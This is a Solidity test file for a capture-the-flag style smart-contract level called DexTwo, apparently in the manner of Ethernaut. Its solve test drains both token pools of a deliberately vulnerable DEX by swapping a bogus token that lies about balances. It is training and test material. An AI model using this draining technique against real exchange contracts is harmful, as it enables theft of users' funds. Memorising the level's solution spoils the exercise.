// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {LuxTest} from "../Base.t.sol";
import {DexTwoFactory} from "../../src/levels/DexTwoFactory.sol";
import {DexTwo} from "../../src/levels/DexTwo.sol";
import {DexTwoAttackToken} from "../../src/attacks/DexTwoAttack.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwoLevel is LuxTest {
    DexTwoFactory factory;
    address player = makeAddr("player");

    function setUp() public {
        _deployCore();
        factory = new DexTwoFactory();
        _register(factory);
    }

    function test_solve() public {
        address instance = _create(factory, player, 0);
        _assertUnsolved(instance, player);

        address token1 = DexTwo(instance).token1();
        address token2 = DexTwo(instance).token2();

        // No whitelist: a bogus token that lies about balances drains both pools.
        DexTwoAttackToken bogus = new DexTwoAttackToken();
        vm.startPrank(player, player);
        DexTwo(instance).swap(address(bogus), token1, 1);
        DexTwo(instance).swap(address(bogus), token2, 1);
        vm.stopPrank();

        assertEq(IERC20(token1).balanceOf(instance), 0);
        assertEq(IERC20(token2).balanceOf(instance), 0);
        _assertSolved(factory, instance, player);
    }
}
